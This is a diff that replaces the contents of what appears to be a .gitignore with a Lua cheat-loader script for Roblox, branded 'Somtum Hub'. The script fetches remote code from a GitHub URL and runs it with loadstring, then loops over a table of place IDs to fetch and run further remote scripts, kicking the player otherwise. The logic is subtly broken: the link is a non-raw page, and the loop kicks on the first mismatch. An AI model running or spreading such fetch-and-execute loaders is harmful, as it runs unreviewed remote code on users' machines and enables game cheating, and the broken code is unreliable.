@@ -1,18 +1,13 @@
-# Build and Release Folders
-bin-debug/
-bin-release/
-[Oo]bj/
-[Bb]in/
+repeat task.wait() until game:IsLoaded()
+repeat task.wait() until game.Players
+repeat task.wait() until game.Players.LocalPlayer
+setfpscap(240)
 
-# Other files and folders
-.settings/
-
-# Executables
-*.swf
-*.air
-*.ipa
-*.apk
-
-# Project files, i.e. `.project`, `.actionScriptProperties` and `.flexProperties`
-# should NOT be excluded as they contain compiler settings and other important
-# information for Eclipse / Flash Builder.
+loadstring(game:HttpGet("https://github.com/krakrav/somtum/blob/main/EFC4826B72BAC25741D52CD335ED8.lua"))()
+for PlaceID, Execute in pairs(Games) do
+    if PlaceID == game.PlaceId then
+        loadstring(game:HttpGet(Execute))()
+    else
+        return game:GetService("Players").LocalPlayer:Kick("[Somtum Hub] : Unable to detect vaild game.")
+    end
+end
